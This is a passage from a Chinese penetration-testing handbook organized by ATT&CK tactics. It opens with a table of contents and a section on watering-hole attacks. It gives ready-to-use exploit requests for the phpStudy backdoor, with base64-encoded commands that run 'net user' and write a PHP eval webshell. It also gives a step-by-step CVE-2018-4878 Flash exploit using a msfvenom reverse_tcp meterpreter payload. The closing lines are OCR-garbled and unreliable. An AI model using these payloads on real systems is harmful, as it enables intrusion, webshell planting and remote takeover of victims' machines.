> [目录： [288](#目录-1)](#目录-1)
>
> [6.1.1 暴力破解 [289](#暴力破解)](#暴力破解)
>
> [6.1.2 凭证转储 [290](#凭证转储)](#凭证转储)
>
> [6.1.9 嗅探 [302](#嗅探)](#嗅探)
>
> [6.1.10 密码过滤 [302](#密码过滤)](#密码过滤)
>
> [6.2 Linux [305](#linux-1)](#linux-1)
[七.Discovery [316](#七.discovery)](#七.discovery)
> [账号查看 [316](#账号查看)](#账号查看)
>
> [应用窗口查看 [321](#应用窗口查看-1)](#应用窗口查看-1)
>
> [浏览器书签栏查看 [322](#浏览器书签栏查看)](#浏览器书签栏查看)
>
> [文件与路径查看 [329](#文件与路径查看-1)](#文件与路径查看-1)
>
> [网络服务扫描 [330](#网络服务扫描-1)](#网络服务扫描-1)
>
> [网络共享查看 [330](#网络共享查看)](#网络共享查看)
>
> [密码策略查看 [331](#密码策略查看)](#密码策略查看)
>
> [外设查看 [334](#外设查看-1)](#外设查看-1)
>
> [权限组查看 [338](#权限组查看)](#权限组查看)
>
> [进程查看 [340](#进程查看)](#进程查看)
>
> [查询注册表 [341](#查询注册表)](#查询注册表)
>
> [远程系统查看 [341](#远程系统查看)](#远程系统查看)
>
> [安全软件查看 [342](#安全软件查看-1)](#安全软件查看-1)
>
> [系统信息查看 [343](#系统信息查看-1)](#系统信息查看-1)
>
> [系统网络设置查看 [347](#系统网络设置查看-1)](#系统网络设置查看-1)
>
> [系统网络链接查看 [351](#系统网络链接查看-1)](#系统网络链接查看-1)
>
> [系统管理员/用户查看 [352](#系统管理员用户查看)](#系统管理员用户查看)
>
> [系统服务查看 [353](#系统服务查看-1)](#系统服务查看-1)
>
> [系统时间查看 [355](#系统时间查看-1)](#系统时间查看-1)
[八.横向渗透 (TA0008) [356](#八.横向渗透-ta0008)](#八.横向渗透-ta0008)
> [1. RID 劫持(hash 传递) (T1075)
> [356](#rid-劫持hash-传递-t1075)](#rid-劫持hash-传递-t1075)
>
> [2. Windows 分布式组件对象模型DCOM (T1175)
> [358](#windows-分布式组件对象模型dcom-t1175)](#windows-分布式组件对象模型dcom-t1175)
>
> [3. 利用 RDP 跳跃网络隔离
> [359](#利用-rdp-跳跃网络隔离)](#利用-rdp-跳跃网络隔离)
[九.C&C Command and Control
[362](#九.cc-command-and-control)](#九.cc-command-and-control)
> [1.1 、常用的端口 [363](#常用的端口)](#常用的端口)
>
> [1.2 、通过移动媒体进行通信
> [365](#通过移动媒体进行通信)](#通过移动媒体进行通信)
>
> [1.3 、连接代理 [366](#连接代理)](#连接代理)
>
> [1.4 、自定义命令和控制协议
> [367](#自定义命令和控制协议)](#自定义命令和控制协议)
>
> [1.5 、自定义加密协议 [369](#自定义加密协议)](#自定义加密协议)
>
> [1.6 、数据编码 [370](#数据编码)](#数据编码)
>
> [1.7 、数据混淆 [371](#数据混淆)](#数据混淆)
>
> [1.8 、域面对 [373](#域面对)](#域面对)
>
> [1.9 、域生成算法 [374](#域生成算法)](#域生成算法)
>
> [1.10 、后备通道 [376](#后备通道)](#后备通道)
>
> [1.11 、多跳代理 [378](#多跳代理)](#多跳代理)
>
> [常用工具 [396](#常用工具-1)](#常用工具-1)
>
> [案例 [399](#案例-1)](#案例-1)
>
> [1. SILENTTRINITY & DONUT
> [400](#silenttrinity-donut)](#silenttrinity-donut)
>
> [2. wikipedia-c2 [402](#wikipedia-c2)](#wikipedia-c2)
>
> [3. Merlin [404](#merlin)](#merlin)
>
> [4. Posh C2 [405](#posh-c2)](#posh-c2)
>
> [5.ICMP (T1095) [406](#icmp-t1095)](#icmp-t1095)
>
> [6.Covenant [407](#covenant)](#covenant)
[十.Exfiltration [410](#十.exfiltration)](#十.exfiltration)
> [1、远程文件复制 [410](#远程文件复制-1)](#远程文件复制-1)
>
> [2、自动脚本窃取 [410](#自动脚本窃取)](#自动脚本窃取)
>
> [3、数据压缩 [413](#数据压缩)](#数据压缩)
>
> [4、代替的协议窃取 [417](#代替的协议窃取)](#代替的协议窃取)
>
> [5、命令控制信道窃取 [418](#命令控制信道窃取)](#命令控制信道窃取)
>
> [6、网络媒介窃取 [418](#网络媒介窃取)](#网络媒介窃取)
>
> [7、数据加密 [419](#数据加密)](#数据加密)
>
> [8、物理介质窃取 [420](#物理介质窃取)](#物理介质窃取)
>
> [9、已计划的转移 [421](#已计划的转移)](#已计划的转移)
# 一、[Initial Access](https://attack.mitre.org/tactics/TA0001/)（入口点）
## 一、[水坑攻击](https://attack.mitre.org/techniques/T1189/)
> 分析并了解目标的上网活动规律，寻找目标经常访问的网站的漏洞，利用漏洞在该网站植入恶意代码（陷阱、水坑），在目标进行访问时，攻击形成。
>
> 多种可能被植入的代码，包括：
1.  通过注入某些形式的恶意代码。例如：JavaScript、iframe、跨站脚本等
2.  植入恶意的广告链接
3.  内置的Web
    应用程序接口用于插入任何其他类型的对象，该对象可用于显示Web
    内容或包含在访问客户端上执行的脚本（例如，论坛帖子，评论和其他用户可控制的Web
    内容）
4.  重定向用户所经常访问的站点到恶意站点
####### 1、在页面嵌入存储型 XSS，获得用户 cookie 信息
> 编写具有恶意功能的javascript 语句，例如获取登录用户cookie、内网ip、
>
> 截屏、网页源代码等操作，配合XSS 平台可查看获取到的信息
>
> ![](media/image3.jpeg){width="4.475738188976378in"
> height="2.6158333333333332in"}
####### 2、phpstudy backdoor
> 2019 年 9 月 20 日杭州公安微信公众账号发布了"杭州警方通报打击涉网违法
>
> 犯罪暨"净网 2019"专项行动战果"的文章，文章里说明phpstudy
> 存在"后门"，攻击者通过在phpstudy 2016 php5.4 和phpstudy2018 php-5.2.17
> 和 php-5.4.45 中植入后门并发布至互联网，导致大量使用phpstudy
> 的用户成为肉鸡。
>
> 后门代码存在于\\ext\\phpxmlrpc.dll模块中phpStudy2016和phpStudy2018自带php-5.2.17、php-5.4.45phpStudy2016路径php\\php-
> 5.2.17\\ext\\phpxmlrpc.dll php\\php-5.4.45\\ext\\phpxmlrpc.dll
> phpStudy2018路径PHPTutorial\\php\\php-5.2.17\\ext\\phpxmlrpc.dll
> PHPTutorial\\php\\php-5.4.45\\ext\\php_xmlrpc.dll 用notepad
> 打开此文件查找@eval，文件存在@eval(%s('%s'))证明漏洞存在，如图：
>
> ![](media/image4.jpeg){width="5.7505129046369206in"
> height="3.435520559930009in"}
>
> net user
>
> GET /index.php HTTP/1.1 Host: 192.168.31.182
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)
> Gecko/201001 01 Firefox/66.0
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
> Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q
>
> =0.2
>
> Accept-Encoding:gzip,deflate Connection: close
>
> Accept-charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7
> Upgrade-Insecure-Requests: 1
>
> Cache-Control: max-age=0
![](media/image5.jpeg){width="5.881943350831146in"
height="1.462082239720035in"}
> 一句话木马
>
> GET /index.php HTTP/1.1 Host: 192.168.0.108
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)
> Gecko/201001 01 Firefox/66.0
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
> Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q
>
> =0.2
>
> Accept-Encoding:gzip,deflate Connection: close
>
> Accept-charset:c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZW
> xsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=
>
> Upgrade-Insecure-Requests: 1
>
> ![](media/image6.jpeg){width="3.964656605424322in"
> height="1.9341666666666666in"}
####### 3、JSONP 水坑攻击
> **4、Adobe flash player 28（CVE-2018-4878）**
>
> 攻击者通过构造特殊的Flash 链接，当用户用浏览器/邮件/Office 访问此
>
> Flash 链接时，会被"远程代码执行"，并且直接被getshell。
>
> 环 境 ： Kali Linux + Windows 7 sp1 渗 透 机 ：Kali Linux （ip：
> 192.168.46.128） 靶机：Windows 7 sp1 （ip：192.168.46.129） exp：
> cve-2018-4878.py flash：flashplayeractivex28.0.0.137.exe
>
> a）使用msfvenom 生成shell 代码
>
> msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.46.128
> lport=88 88 -f python\>shellcode.txt
b)  进入CVE-2018-4878-master 目录，编辑CVE-2018-4878.py 文件，将
    msfvenom 生成的代码覆盖掉原来的代码：
> ![](media/image7.jpeg){width="5.747304243219598in"
> height="4.474687226596675in"}
>
> 修改swf 文件及html 文件位置：
>
> ![](media/image8.jpeg){width="5.886332020997376in"
> height="1.4345833333333333in"}
c)  Python 执行CVE-2018-4878-master.py 代码，会生成两个文件，一个 swf
    文件，一个html 文件
> python cve-2018-4878.py
>
> ![](media/image9.jpeg){width="5.891846019247594in"
> height="1.090832239720035in"}
d)  Kali Linux 开启Apache2 服务，并将上面的 2 个文件放入/var/www/html
    目录中（apache web 路径）
> service apache2 start
>
> cp index2.html /var/www/html/index2.html cp exploit.swf
> /var/www/html/exploit.swf
e)  Kali 开启shell 监听
> ![](media/image10.jpeg){width="5.738645013123359in"
> height="1.6035411198600176in"}
f)  win7 上安装Adobe Flash Player28
> ![](media/image11.jpeg){width="5.74507217847769in" height="2.95625in"}
g)  使用win7 自带的IE8 浏览器访问 192.168.46.128/index2.html
> ![](media/image12.jpeg){width="5.883642825896763in"
> height="3.703333333333333in"}
h)  Kali Linux 上成功获取meterpreter shell
> lI 罚千冒可一
>
> Interface 1
>
> ============
##### Name Hardware MAC MTU
> IPv4 Address IPv4 Netmask IPv6 Address IPv6 Netmask
>
> Software Loopback Interface 1 00:00:00:00:00:00
>
> 4294967295
>
> 127.0.0.1
>
> 255.0.0.0
>
> : :1
##### ffff: ffff: ffff: ffff: ffff: ffff: ffff: ffff
> Interface 11
>
> ＝＝＝＝＝＝＝＝＝＝＝＝ Name Hardware MAC MTU
##### IPv4 Address IPv4 Netmask IPv6 Address IPv6 Netmask